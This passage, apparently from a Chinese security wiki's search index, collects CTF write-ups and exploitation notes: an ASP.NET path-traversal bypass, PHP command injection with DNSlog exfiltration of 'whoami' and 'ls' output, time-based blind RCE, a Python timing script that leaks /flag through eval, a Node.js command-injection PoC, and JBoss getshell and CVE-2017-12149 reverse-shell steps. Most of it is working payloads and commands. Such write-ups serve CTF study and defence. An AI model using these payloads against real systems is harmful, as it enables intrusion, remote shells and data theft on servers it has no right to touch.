RequestValidator.Current.IsValidRequestString -&gt; rossSiteScriptingValidation.IsDangerousString -&gt; throw new HttpRequestValidationException)\n\nAnd it validated the Form data only once, so it will not throw any exception when we called it in the second time.\npublic NameValueCollection Form {\n    get {\n        EnsureForm();\n\n        if (_flags[needToValidateForm]) {\n            _flags.Clear(needToValidateForm);\n            ValidateHttpValueCollection(_form, RequestValidationSource.Form);\n        }\n\n        return _form;\n    }\n}\n\nhttps://balsn.tw/ctf_writeup/20191012-hitconctfquals/#buggy-.net\n</code></pre> <p>Request.Form\uff1a\u83b7\u53d6\u4ee5POST\u65b9\u5f0f\u63d0\u4ea4\u7684\u6570\u636e\u3002</p> <p>Request.QueryString\uff1a\u83b7\u53d6\u5730\u5740\u680f\u53c2\u6570\uff08\u4ee5GET\u65b9\u5f0f\u63d0\u4ea4\u7684\u6570\u636e\uff09\u3002</p> <p>\u7efc\u4e0a\u6240\u8ff0\uff0c\u6709\u70b9\u50cfasp.net\u7684\u8bed\u8a00\u7279\u6027\u4e4b\u4e00\uff0cRequest.From\u5728\u63a5\u53d7\u5230\u4ee5GET\u5f62\u5f0f\u4f20\u6765\u7684x-www-form-urlencode\u7c7b\u578b\u7684\u6570\u636e\u65f6\uff0c\u53ea\u4f1a\u62a5\u4e00\u6b21\u9519\uff0c\u5728\u8fd9\u91cc\u76f8\u5f53\u4e8e\u7b2c\u4e00\u6761\u8fdb\u4e86exception\uff0c\u7b2c\u4e8c\u6761\u6ca1\u62a5\u9519\u8fdb\u4e86try\u8bfb\u6587\u4ef6\u3002</p> <p>\u56e0\u6b64\u6700\u540e\u7684paylaod</p> <pre><code>GET / HTTP/1.1\nHost: xxx\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: \nReferer: xxx\n\nfilename=../../FLAG.txt&amp;AAA=&lt;!\n</code></pre>"},{"location":"web/writeup/Time_based-Rce/","title":"[RCTF2019]calcalcalc \u547d\u4ee4\u6267\u884c\u7684\u65f6\u95f4\u76f2\u6ce8","text":"<p>\u9996\u5148\u8ba9\u6211\u4eec\u591a\u4e86\u89e3\u4e00\u4e9b\u59ff\u52bf</p>"},{"location":"web/writeup/Time_based-Rce/#dnslog","title":"DNSLOG\u6ce8\u5165\u653b\u51fb","text":"<p>\u8fd9\u662f\u4e00\u4e2a\u5e38\u89c1\u7684\u53cd\u5f15\u53f7\u4ee3\u7801\u6267\u884c</p> <p>\u73b0\u5728\u5c06\u4ee3\u7801\u4fee\u6539\u4e3a\uff1a</p> <pre><code>&lt;?php\nhighlight_file('index.php');\n$cmd = $_GET['cmd'];\n`$cmd`;\n?&gt;\n</code></pre> <p>\u6211\u4eec\u77e5\u9053\u547d\u4ee4\u80af\u5b9a\u662fshell_exec\u4e86\uff0c\u4f46\u5173\u952e\u662f\u6211\u4eec\u8be5\u5982\u4f55\u5f97\u5230\u8be5\u547d\u4ee4\u7684\u56de\u663e\u5462\uff1f</p> <p>\u7ecf\u8fc7\u7f51\u4e0a\u51b2\u6d6a\uff0c\u53d1\u73b0\u4e86\u4e24\u79cd\u65b9\u6cd5\uff0c\u4e00\u79cd\u662f\u7528dns\u67e5\u8be2\uff0c\u4e00\u79cd\u662f\u5229\u7528curl\u547d\u4ee4</p> <p>\u4e0b\u9762\u662f\u6211\u7684\u5c1d\u8bd5\u590d\u73b0\u8fc7\u7a0b</p> <pre><code>\u4e3a\u4e86\u65b9\u4fbf\u8c03\u8bd5\u52a0\u4e86\u4e00\u884c\n&lt;?php\nhighlight_file('index.php');\n$cmd = $_GET['cmd'];\n`$cmd`;\necho `$cmd`;\n?&gt;\n</code></pre> <p>\uff08\u4e2a\u4eba\u57df\u540d\u6ce8\u518c\u5907\u6848\u8fc7\u7a0b\u5b9e\u5728\u662f\u6709\u70b9\u7e41\u7410\uff0c\u7b49\u57df\u540d\u5907\u6848\u5b8c\u6210\u540e\u6211\u4f1a\u518d\u6b21\u5c1d\u8bd5\uff09</p> <p></p> <p>\u622a\u56fe\u662f\u8fd9\u6837\u7684</p>"},{"location":"web/writeup/Time_based-Rce/#vps","title":"\u5728vps\u5e03\u7f6e\u4e0a\u8ff0\u7684\u4ee3\u7801","text":""},{"location":"web/writeup/Time_based-Rce/#httpwwwdnslogcn","title":"http://www.dnslog.cn/ \u4e0a\u8bf7\u6c42\u4e34\u65f6\u57df\u540d","text":""},{"location":"web/writeup/Time_based-Rce/#_1","title":"\u7136\u540e\u5728\u7f51\u7ad9\u4e0a\u8bf7\u6c42","text":"<pre><code>/?cmd=curl%20`whoami`.e4bj32.dnslog.cn\n\n\u6216\u8005\u662f\n\nping%20`ls`.e4bj32.dnslog.cn\n</code></pre> <p>\u7136\u540e\u6211\u4eec\u80fd\u770b\u89c1\u4e0a\u9762\u7684\u7ed3\u679c\u3002</p> <p>\u6267\u884c\u4e86ls\u547d\u4ee4\u5e76\u4e14\u8fd4\u56de\u4e86\u67e5\u8be2\u5230\u7684\u7b2c\u4e00\u6761\u4fe1\u606f\uff0c\u4f46\u662f\u95ee\u9898\u662f\u8fd9\u5e76\u4e0d\u5b8c\u6574\u3002</p> <p>\u5728sql\u4e2d\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528limit\u6765\u786e\u5b9a\u504f\u79fb\u91cf\uff0c\u90a3\u4e48\u5728linux\u4e2d\u6709\u4ec0\u4e48\u65b9\u6cd5\u5462\uff1f</p>"},{"location":"web/writeup/Time_based-Rce/#sed","title":"SED","text":"<p>Linux sed \u547d\u4ee4\u662f\u5229\u7528\u811a\u672c\u6765\u5904\u7406\u6587\u672c\u6587\u4ef6\u3002</p> <p>sed \u53ef\u4f9d\u7167\u811a\u672c\u7684\u6307\u4ee4\u6765\u5904\u7406\u3001\u7f16\u8f91\u6587\u672c\u6587\u4ef6\u3002</p> <p>Sed \u4e3b\u8981\u7528\u6765\u81ea\u52a8\u7f16\u8f91\u4e00\u4e2a\u6216\u591a\u4e2a\u6587\u4ef6\u3001\u7b80\u5316\u5bf9\u6587\u4ef6\u7684\u53cd\u590d\u64cd\u4f5c\u3001\u7f16\u5199\u8f6c\u6362\u7a0b\u5e8f\u7b49\u3002</p> <pre><code>-n, --quiet, --silent\n               suppress automatic printing of pattern space\n-e script, --expression=script\n               add the script to the commands to be executed\n-f script-file, --file=script-file\n               add the contents of script-file to the commands to be executed\n--follow-symlinks\n               follow symlinks when processing in place\n-i[SUFFIX], --in-place[=SUFFIX]\n               edit files in place (makes backup if SUFFIX supplied)\n-l N, --line-length=N\n               specify the desired line-wrap length for the `l' command\n--posix\n               disable all GNU extensions.\n-r, --regexp-extended\n               use extended regular expressions in the script.\n-s, --separate\n               consider files as separate rather than as a single continuous\n               long stream.\n-u, --unbuffered\n               load minimal amounts of data from the input files and flush\n               the output buffers more often\n-z, --null-data\n               separate lines by NUL characters\n    --help     display this help and exit\n    --version  output version information and exit\n\n\n\u53c2\u6570\u8bf4\u660e\uff1a\n    -e&lt;script&gt;\u6216--expression=&lt;script&gt; \u4ee5\u9009\u9879\u4e2d\u6307\u5b9a\u7684script\u6765\u5904\u7406\u8f93\u5165\u7684\u6587\u672c\u6587\u4ef6\u3002\n    -f&lt;script\u6587\u4ef6&gt;\u6216--file=&lt;script\u6587\u4ef6&gt; \u4ee5\u9009\u9879\u4e2d\u6307\u5b9a\u7684script\u6587\u4ef6\u6765\u5904\u7406\u8f93\u5165\u7684\u6587\u672c\u6587\u4ef6\u3002\n    -h\u6216--help \u663e\u793a\u5e2e\u52a9\u3002\n    -n\u6216--quiet\u6216--silent \u4ec5\u663e\u793ascript\u5904\u7406\u540e\u7684\u7ed3\u679c\u3002\n    -V\u6216--version \u663e\u793a\u7248\u672c\u4fe1\u606f\u3002\n\n\u52a8\u4f5c\u8bf4\u660e\uff1a\n\n    a \uff1a\u65b0\u589e\uff0c a \u7684\u540e\u9762\u53ef\u4ee5\u63a5\u5b57\u4e32\uff0c\u800c\u8fd9\u4e9b\u5b57\u4e32\u4f1a\u5728\u65b0\u7684\u4e00\u884c\u51fa\u73b0(\u76ee\u524d\u7684\u4e0b\u4e00\u884c)\uff5e\n    c \uff1a\u53d6\u4ee3\uff0c c \u7684\u540e\u9762\u53ef\u4ee5\u63a5\u5b57\u4e32\uff0c\u8fd9\u4e9b\u5b57\u4e32\u53ef\u4ee5\u53d6\u4ee3 n1,n2 \u4e4b\u95f4\u7684\u884c\uff01\n    d \uff1a\u5220\u9664\uff0c\u56e0\u4e3a\u662f\u5220\u9664\u554a\uff0c\u6240\u4ee5 d \u540e\u9762\u901a\u5e38\u4e0d\u63a5\u4efb\u4f55\u549a\u549a\uff1b\n    i \uff1a\u63d2\u5165\uff0c i \u7684\u540e\u9762\u53ef\u4ee5\u63a5\u5b57\u4e32\uff0c\u800c\u8fd9\u4e9b\u5b57\u4e32\u4f1a\u5728\u65b0\u7684\u4e00\u884c\u51fa\u73b0(\u76ee\u524d\u7684\u4e0a\u4e00\u884c)\uff1b\n    p \uff1a\u6253\u5370\uff0c\u4ea6\u5373\u5c06\u67d0\u4e2a\u9009\u62e9\u7684\u6570\u636e\u5370\u51fa\u3002\u901a\u5e38 p \u4f1a\u4e0e\u53c2\u6570 sed -n \u4e00\u8d77\u8fd0\u884c\uff5e\n    s \uff1a\u53d6\u4ee3\uff0c\u53ef\u4ee5\u76f4\u63a5\u8fdb\u884c\u53d6\u4ee3\u7684\u5de5\u4f5c\u54e9\uff01\u901a\u5e38\u8fd9\u4e2a s \u7684\u52a8\u4f5c\u53ef\u4ee5\u642d\u914d\u6b63\u89c4\u8868\u793a\u6cd5\uff01\u4f8b\u5982 1,20s/old/new/g \u5c31\u662f\u5566\uff01 \n</code></pre> <p></p> <p>\u6211\u4eec\u518d\u5c1d\u8bd5\u4e00\u4e0b<code>ls | sed -n '1p'</code></p> <p></p> <p>\u6210\u529f\u67e5\u770b\u5230\u4e86ls \u6307\u4ee4\u7684\u5176\u4ed6\u5185\u5bb9\u3002</p> <p>\u6253\u51fa\u6765\u7684\u4fe1\u606f\u53ef\u80fd\u4f1a\u53d7\u5230\u957f\u5ea6\u7684\u9650\u5236\uff0c\u8fd9\u53c8\u8be5\u5982\u4f55\u89e3\u51b3\u5462\uff1f</p>"},{"location":"web/writeup/Time_based-Rce/#cut","title":"cut","text":"<pre><code>-b, --bytes=LIST        select only these bytes\n-c, --characters=LIST   select only these characters\n-d, --delimiter=DELIM   use DELIM instead of TAB for field delimiter\n-f, --fields=LIST       select only these fields;  also print any line\n                          that contains no delimiter character, unless\n                          the -s option is specified\n-n                      (ignored)\n    --complement        complement the set of selected bytes, characters\n                          or fields\n-s, --only-delimited    do not print lines not containing delimiters\n    --output-delimiter=STRING  use STRING as the output delimiter\n                          the default is to use the input delimiter\n-z, --zero-terminated    line delimiter is NUL, not newline\n    --help     display this help and exit\n    --version  output version information and exit\n\n\n\u53c2\u6570:\n\n    -b \uff1a\u4ee5\u5b57\u8282\u4e3a\u5355\u4f4d\u8fdb\u884c\u5206\u5272\u3002\u8fd9\u4e9b\u5b57\u8282\u4f4d\u7f6e\u5c06\u5ffd\u7565\u591a\u5b57\u8282\u5b57\u7b26\u8fb9\u754c\uff0c\u9664\u975e\u4e5f\u6307\u5b9a\u4e86 -n \u6807\u5fd7\u3002\n    -c \uff1a\u4ee5\u5b57\u7b26\u4e3a\u5355\u4f4d\u8fdb\u884c\u5206\u5272\u3002\n    -d \uff1a\u81ea\u5b9a\u4e49\u5206\u9694\u7b26\uff0c\u9ed8\u8ba4\u4e3a\u5236\u8868\u7b26\u3002\n    -f \uff1a\u4e0e-d\u4e00\u8d77\u4f7f\u7528\uff0c\u6307\u5b9a\u663e\u793a\u54ea\u4e2a\u533a\u57df\u3002\n    -n \uff1a\u53d6\u6d88\u5206\u5272\u591a\u5b57\u8282\u5b57\u7b26\u3002\u4ec5\u548c -b \u6807\u5fd7\u4e00\u8d77\u4f7f\u7528\u3002\u5982\u679c\u5b57\u7b26\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u843d\u5728\u7531 -b \u6807\u5fd7\u7684 List \u53c2\u6570\u6307\u793a\u7684\n    \u8303\u56f4\u4e4b\u5185\uff0c\u8be5\u5b57\u7b26\u5c06\u88ab\u5199\u51fa\uff1b\u5426\u5219\uff0c\u8be5\u5b57\u7b26\u5c06\u88ab\u6392\u9664\n</code></pre> <p>\u6211\u4eec\u518d\u6765\u5c1d\u8bd5\uff1a<code>ls | sed -n '3p' | cut -c 3</code></p>"},{"location":"web/writeup/Time_based-Rce/#time-based-rce","title":"Time-Based-RCE","text":"<p>\u63d0\u4ea4\uff1a</p> <pre><code>?cmd=if [1=1];then sleep 10;fi\n//\u771f\uff0c\u6d4f\u89c8\u5668\u6c89\u9ed810s\n?cmd=if [1=2];then sleep 10;fi\n//\u5047\uff0c\u6d4f\u89c8\u5668\u7acb\u5373\u54cd\u5e94\n</code></pre> <p>\u7c7b\u4f3csql\u6ce8\u5165\u7684\u65f6\u95f4\u76f2\u6ce8\uff0c\u5229\u7528\u54cd\u5e94\u65f6\u95f4\u6765\u5224\u65ad\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u8fbe\u5230\u5339\u914d\u5b57\u7b26\u7684\u76ee\u7684\uff0c\u5229\u7528\u540e\u7aef\u6765\u5e2e\u6211\u4eec\u731c\u89e3\u7b54\u6848</p> <p>\u56e0\u6b64 payload:</p> <pre><code>?cmd = if [$(whoami|base32|cut \u2013c 1)=O];then sleep 10;fi\n</code></pre>"},{"location":"web/writeup/Time_based-Rce/#calcalcalc","title":"calcalcalc","text":"<p>\u5199\u5b8c\u4e86\u6ca1\u70b9\u4fdd\u5b58\uff0c\u770bpayload\u7406\u89e3\u5427</p> <pre><code>import requests\nfrom time import time\n\nurl = 'http://6816f9f6-a412-4c2b-bf5b-85130b7d25e4.node4.buuoj.cn:81/calculate'\n\n\ndef encode(payload):\n    return 'eval(%s)' % ('+'.join('chr(%d)' % ord(c) for c in payload))\n\n\ndef query(bool_expr):\n    payload = \"__import__('time').sleep(5) if %s else 1\" % bool_expr\n    t = time()\n    r = requests.post(url, json={'isVip': True, 'expression': encode(payload)})\n    # print(r.text)\n    delta = time() - t\n    print(payload, delta)\n    return delta &gt; 5\n\ndef binary_search(geq_expression, l, r):\n    eq_expression = geq_expression.replace('&gt;=', '==')\n    while True:\n        if (r - l) &lt; 4:\n            for mid in range(l, r + 1):\n                if query(eq_expression.format(num=mid)):\n                    return mid\n            else:\n                print('NOT FOUND')\n                return\n        mid = (l + r) // 2\n        if query(geq_expression.format(num=mid)):\n            l = mid\n        else:\n            r = mid\n\n# flag_len = binary_search(\"len(open('/flag').read())&gt;={num}\", 0, 100)\nflag_len = 50\nprint('flag length: %d' % flag_len)\n\nflag = ''\nwhile len(flag) &lt; flag_len:\n    c = binary_search(\"ord(open('/flag').read()[%d])&gt;={num}\" % len(flag), 0, 128)\n    if c:   # the bs may fail due to network issues\n        flag += chr(c)\n    print(flag)\n</code></pre> <p>\u8fd9\u4e2a\u662f\u9884\u671f\u89e3</p> <p>https://www.xctf.org.cn/library/details/6cf4733304d816ebb21ff2e4c810ee90ccb7f97f/</p>"},{"location":"web/writeup/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E5%8D%8A%E5%86%B3%E8%B5%9B%5DBabyJS/","title":"[\u7f51\u9f0e\u676f 2020 \u534a\u51b3\u8d5b]BabyJS","text":"<p>\u7ed9\u51fa\u6e90\u7801\u4ee5\u53ca\u5173\u952e\u903b\u8f91\uff0c\u5e76\u4e0d\u7b97\u662f\u7279\u522b\u590d\u6742</p> <pre><code>var express = require('express');\nvar config = require('../config');\nvar url=require('url');\nvar child_process=require('child_process');\nvar fs=require('fs');\nvar request=require('request');\nvar router = express.Router();\n\n\nvar blacklist=['127.0.0.1.xip.io','::ffff:127.0.0.1','127.0.0.1','0','localhost','0.0.0.0','[::1]','::1'];\n\nrouter.get('/', function(req, res, next) {\n    res.json({});\n});\n\nrouter.get('/debug', function(req, res, next) {\n    console.log(req.ip);\n    if(blacklist.indexOf(req.ip)!=-1){\n        console.log('res');\n    var u=req.query.url.replace(/[\\\"\\']/ig,'');\n    console.log(url.parse(u).href);\n    let log=`echo  '${url.parse(u).href}'&gt;&gt;/tmp/log`;\n    console.log(log);\n    child_process.exec(log);\n    res.json({data:fs.readFileSync('/tmp/log').toString()});\n    }else{\n        res.json({});\n    }\n});\n\n\nrouter.post('/debug', function(req, res, next) {\n    console.log(req.body);\n    if(req.body.url !== undefined) {\n        var u = req.body.url;\n    var urlObject=url.parse(u);\n    if(blacklist.indexOf(urlObject.hostname) == -1){\n        var dest=urlObject.href;\n        request(dest,(err,result,body)=&gt;{\n            res.json(body);\n        })\n    }\n    else{\n        res.json([]);\n    }\n    }\n});\n\nmodule.exports = router;\n</code></pre> <p>\u6b63\u5e38\u8def\u5f84\u4e0b\u8fd4\u56de\u4e00\u4e2a\u7a7a\u7684json\u6587\u4ef6\uff0c\u7136\u540e/debug\u8def\u5f84\u4e0b\u5206\u4e3aPOST\u548cGET\u4e24\u79cd\u8bf7\u6c42\u3002\u80fd\u770b\u89c1POST\u8bf7\u6c42\u4e0b\u6709\u4e00\u4e2aurl.parse()\u51fd\u6570</p> <pre><code>\u4f7f\u7528 url.parse()\u65b9\u6cd5\u5c06\u8def\u5f84\u89e3\u6790\u4e3a\u4e00\u4e2a\u65b9\u4fbf\u64cd\u4f5c\u7684\u5bf9\u8c61\u3002\n\u7b2c\u4e8c\u4e2a\u53c2\u6570\u4e3a true \u8868\u793a\u76f4\u63a5\u5c06\u67e5\u8be2\u5b57\u7b26\u4e32\u8f6c\u4e3a\u4e00\u4e2a\u5bf9\u8c61\uff08\u901a\u8fc7query\u5c5e\u6027\u6765\u8bbf\u95ee\uff09\uff0c\u9ed8\u8ba4\u7b2c\u4e8c\u4e2a\u53c2\u6570\u4e3afalse\u3002\n</code></pre> <p>POST\u91cc\u9762\u7684\u903b\u8f91\u5927\u6982\u63a5\u53d7\u7528\u6237\u4f20\u6765\u7684\u6570\u636e\uff0c\u7136\u540e\u7ecf\u8fc7url.parse\uff0c\u5224\u65ad\u662f\u5426\u5728\u9ed1\u540d\u5355\u4e2d\u51fa\u73b0\uff0c\u662f\u7684\u8bdd\u8fd4\u56de\u7a7a\uff0c\u5426\u5219\u7684\u8bdd\u5c06\u4ea7\u751f\u7684\u7ed3\u679c\u7ee7\u7eed\u8bf7\u6c42\uff0c\u76f8\u5f53\u4e8e\u8fdb\u4e86/debug\u7684GET\u90e8\u5206\u3002</p> <p>GET\u91cc\u7684\u903b\u8f91\u662f\u5982\u679c\u662f\u672c\u5730\u8bbf\u95ee\u5c31\u8bfb\u53d6get\u53c2\u6570\u4e2d\u7684url\u53c2\u6570\uff0c\u53bb\u9664\u5176\u4e2d\u7684\u5355\u5f15\u53f7\u548c\u53cc\u5f15\u53f7\uff0c\u7136\u540e\u7528nodejs\u7684url.parse\u53bb\u89e3\u6790\u3002\u628a\u89e3\u6790\u540e\u7684url\u62fc\u63a5\u5230\u4e00\u6761shell\u547d\u4ee4\u4e2d\u6267\u884c\u3002\u4e4b\u540e\u8fd4\u56de/tmp/log\u6587\u4ef6\u4e2d\u7684\u5185\u5bb9\u3002</p> <p>\u5927\u81f4\u7684\u903b\u8f91\u94fe\u5c31\u80fd\u62df\u51fa\u3002</p> <pre><code>\u9ed1\u540d\u5355\u8fc7\u6ee4\u7684127.0.0.1\u5b9e\u9645\u4e0a\u6ca1\u5565\u4f5c\u7528\uff0c\u56e0\u4e3a\u4f8b\u5982127.0.0.2\uff0c\u751a\u81f3127.0.0.1\u5230127.255.255.254\u90fd\u5c5e\u4e8e\u672c\u5730\u56de\u73af\u7f51\u7edc\n\n@\u524d\uff0c\u4e5f\u5c31\u662fURL\u4e2d\u8868\u793a\u7528\u6237\u540d\u548c\u5bc6\u7801\u7684\u5b57\u6bb5\u4f1a\u88ab\u4e8c\u6b21\u89e3\u7801\nhttp://%2527@xx\u8fd9\u6837\u7684\u4e1c\u897f\u80fd\u591f\u7ed5\u8fc7\u5355\u53cc\u5f15\u53f7\u7684\u9650\u5236\n\n\u6700\u540e\u7684poc\n{\"url\":\"http://127.0.0.2:3000/debug?url=http://a%2527@a;cp$IFS/flag$IFS/tmp/log%00\"}\n\u62fc\u63a5\u4e00\u4e0b\u770b\u770b\uff1a\necho  'http://a%2527@a;cp$IFS/flag$IFS/tmp/log%00'&gt;&gt;/tmp/log\n;\u8868\u793a\u9694\u5f00\u547d\u4ee4\uff0c%00\u622a\u65ad\u4e86\u540e\u7eed\u7684\u91cd\u5b9a\u5411\u7b26\u53f7\n</code></pre> <p>\u6700\u7ec8\uff1a</p> <pre><code>POST /debug HTTP/1.1\n\nHost: c1d73d87-dac2-4a5a-9fca-cf868ae144aa.node4.buuoj.cn\n\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\n\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\n\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\n\nAccept-Encoding: gzip, deflate\n\nConnection: close\n\nContent-Type: application/json\n\nCookie: UM_distinctid=17b0a55a0d936f-00af545b3ada28-31634645-410100-17b0a55a0da10; session=eyJhZG1pbiI6Im5vIn0=; session.sig=XE3E3dxGe4xLwivd7_2AbjNcdIU\n\nUpgrade-Insecure-Requests: 1\n\nCache-Control: max-age=0\n\nContent-Length: 85\n\n\n\n{\"url\":\"http://127.0.0.2:3000/debug?url=http://a%2527@a;cp$IFS/flag$IFS/tmp/log%00\"}\n</code></pre>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/Java/jboss_getshell/","title":"JBoss","text":""},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/Java/jboss_getshell/#jmx-consolegetshell","title":"JMX Console\u672a\u6388\u6743\u8bbf\u95eeGetshell","text":"<p>\u6b64\u6f0f\u6d1e\u4e3b\u8981\u662f\u7531\u4e8e<code>JBoss</code>\u4e2d<code>/jmx-console/HtmlAdaptor</code>\u8def\u5f84\u5bf9\u5916\u5f00\u653e\uff0c\u5e76\u4e14\u6ca1\u6709\u4efb\u4f55\u8eab\u4efd\u9a8c\u8bc1\u673a\u5236\uff0c\u5bfc\u81f4\u653b\u51fb\u8005\u53ef\u4ee5\u8fdb\u2f0a\u5230<code>jmx</code>\u63a7\u5236\u53f0\uff0c\u5e76\u5728\u5176\u4e2d\u6267\u2f8f\u4efb\u4f55\u529f\u80fd\u3002</p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/Java/jboss_getshell/#_1","title":"\u6f0f\u6d1e\u5229\u7528","text":"<p>1\u3001\u9996\u5148\u8bbf\u95ee<code>http://10.211.55.7:8080/jmx-console/</code>\u7136\u540e\u627e\u5230<code>jboss.deployment</code>\uff08jboss \u81ea\u5e26\u7684\u90e8\u7f72\u529f\u80fd\uff09\u4e2d\u7684<code>flavor=URL,type=DeploymentScanner</code>\u70b9\u8fdb\u53bb\uff08\u901a\u8fc7 url \u7684\u65b9\u5f0f\u8fdc\u7a0b\u90e8\u7f72\uff09</p> <p></p> <p>2\u3001\u627e\u5230\u9875\u9762\u4e2d\u7684<code>void addURL()</code>\u9009\u9879\u6765\u8fdc\u7a0b\u52a0\u8f7dwar\u5305\u6765\u90e8\u7f72\u3002</p> <p></p> <p>3\u3001\u70b9\u51fb<code>invoke</code>\u4e4b\u540e\u4f1a\u63d0\u793a\u90e8\u7f72\u6210\u529f,\u5982\u4e0b</p> <p></p> <p>4\u3001\u90e8\u7f72\u5b8c\u6210\u540e\u56de\u5230<code>flavor=URL,type=DeploymentScanner</code>\u9875\u9762\u70b9\u51fb\u4e0b\u5c5e\u6027\u5217\u8868\u4e2d\u7684\"Apply change\"</p> <p></p> <p>5\u3001\u6700\u540e\u8bbf\u95ee\u2f4a\u2ee2\u5730\u5740\u4e3a<code>http://10.211.55.7:8080/bm1/index.jsp</code></p> <p></p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/Java/jboss_getshell/#rce","title":"\u53cd\u5e8f\u5217\u5316RCE\u6f0f\u6d1e","text":""},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/Java/jboss_getshell/#jbossas-5x6x-cve-2017-12149","title":"JBosSAS 5.x,6.X \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\uff08CVE-2017-12149\uff09","text":""},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/Java/jboss_getshell/#_2","title":"\u6f0f\u6d1e\u63cf\u8ff0","text":"<p>\u6b64\u6f0f\u6d1e\u4e3b\u8981\u662f\u7531\u4e8e<code>jboss\\server\\all\\deploy\\httpha-invoker.sar\\invoker.war\\WEB-INF\\classes\\org\\jboss\\invocation\\http\\servlet</code>\u76ee\u5f55\u4e0b\u7684<code>ReadOnlyAccessFilter.class</code>\u6587\u4ef6\u4e2d\u7684<code>doFilter</code>\u65b9\u6cd5\uff0c\u518d\u5c06\u5e8f\u5217\u5316\u4f20\u5165<code>ois</code>\u4e2d\uff0c\u5e76\u6ca1\u6709\u8fdb\u884c\u8fc7\u6ee4\u4fbf\u8c03\u7528\u4e86<code>readObject()</code>\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\uff0c\u5bfc\u81f4\u4f20\u5165\u7684\u643a\u5e26\u6076\u610f\u4ee3\u7801\u7684\u5e8f\u5217\u5316\u6570\u636e\u6267\u884c\uff0c\u9020\u6210\u4e86\u53cd\u5e8f\u5217\u5316\u7684\u6f0f\u6d1e\u3002</p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/Java/jboss_getshell/#_3","title":"\u5f71\u54cd\u7248\u672c","text":"<p>JbossAS 5.x , JbossAS 6.x</p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/Java/jboss_getshell/#_4","title":"\u6f0f\u6d1e\u5229\u7528","text":"<p>1\u3001\u9996\u5148\u4ecehttp\u54cd\u5e94\u5934\u548ctitle\u4e2d\u4e00\u822c\u60c5\u51b5\u4e0b\u90fd\u80fd\u770b\u5230\u4fe1\u606f\u6765\u786e\u5b9a\u76ee\u6807 jboss \u7248\u672c\u662f\u5426\u5728\u6b64\u6f0f\u6d1e\u7248\u672c\u8303\u56f4</p> <p></p> <p>2\u3001\u786e\u5b9a\u76ee\u6807\u7684 jboss \u662f\u5426\u5b58\u5728\u6b64\u6f0f\u6d1e,\u76f4\u63a5\u8bbf\u95ee <code>poc url: http://192.168.3.81:8080/invoker/readonly</code> \u5982\u679c\u51fa\u73b0\u62a5 500 \u9519\u8bef,\u5219\u8bf4\u660e\u76ee\u6807\u673a\u5668\u53ef\u80fd\u5b58\u5728\u6b64\u6f0f\u6d1e</p> <p></p> <p>3\u3001\u660e\u786e\u76ee\u6807<code>jboss</code>\u53ef\u80fd\u5b58\u5728\u6b64\u6f0f\u6d1e\u4ee5\u540e,\u63a5\u4e0b\u6765\u501f\u52a9<code>JavaDeserH2HC</code>\u6765\u5b8c\u6210\u6574\u4e2a\u5229\u7528\u8fc7\u7a0b</p> <pre><code>git clone https://github.com/joaomatosf/JavaDeserH2HC.git \ncd JavaDeserH2HC/\n</code></pre> <p>4\u3001\u9996\u5148\u5c1d\u8bd5\u76f4\u63a5\u53cd\u5f39<code>shell</code>,\u5229\u7528<code>JavaDeserH2HC</code>\u521b\u5efa\u597d\u7528\u4e8e\u53cd\u5f39<code>shell</code>\u7684 payload,\u5982\u4e0b</p> <pre><code>javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java\njava -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap vps\u7684ip:\u7aef\u53e3 \n</code></pre> <p>4\u3001\u7136\u540e\u5c1d\u8bd5\u5229\u7528<code>curl</code>\u53d1\u9001<code>payload</code>\u5230\u76ee\u6807\u673a\u5668\u4e0a\u6267\u884c\u540e\uff0c\u53d1\u73b0vps\u5df2\u6210\u529f\u63a5\u5f39\u56de\u7684shell</p> <pre><code>curl http://www.target.net/invoker/readonly --data-binary @ReverseShellCommonsCollectionsHashMap.ser\n</code></pre> <p></p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/Java/jboss_getshell/#jbossmq-jms-cve-2017-7504","title":"JBOSSMQ JMS \u96c6\u7fa4\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\uff08CVE-2017-7504\uff09","text":""},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/Java/jboss_getshell/#_5","title":"\u6f0f\u6d1e\u63cf\u8ff0","text":"<p><code>JBoss AS 